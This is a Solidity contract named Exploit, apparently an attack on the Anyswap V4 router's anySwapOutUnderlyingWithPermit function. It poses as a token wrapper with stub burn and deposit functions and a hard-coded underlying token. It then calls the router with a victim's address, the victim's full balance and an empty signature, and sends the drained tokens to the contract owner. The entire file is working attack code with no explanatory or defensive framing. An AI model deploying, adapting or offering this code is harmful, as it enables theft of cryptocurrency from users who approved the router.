//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}
interface AnyswapV4Router {
    function anySwapOutUnderlyingWithPermit ( address from, address token, address to, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s, uint256 toChainID ) external;
}

contract Exploit {
    address private owner;
    IERC20 private token;

    constructor() {
        owner = msg.sender;
    }

    function underlying() public view returns (address) {
        address token=0x2c5E8A3B3AAD9DF32339409534E64DFCABcd3A65;
        return token;
    }
    function burn(address from, uint256 amount) external returns (bool){
        return true;
    }
    function depositVault(uint amount, address to) external returns (uint){
        return 1;
    }

    function setUnderlying(IERC20 _token) public {
        require(msg.sender==owner);
        token = _token;
    }

    function withdraw() public {
        token.transfer(owner,token.balanceOf(address(this)));
    }

    function attack(AnyswapV4Router anyswapV4Router,address from) public {
        anyswapV4Router.anySwapOutUnderlyingWithPermit(from,address(this),msg.sender,token.balanceOf(from), 100000000000000000000,0,bytes32(0),bytes32(0),56);
        withdraw();
    }

}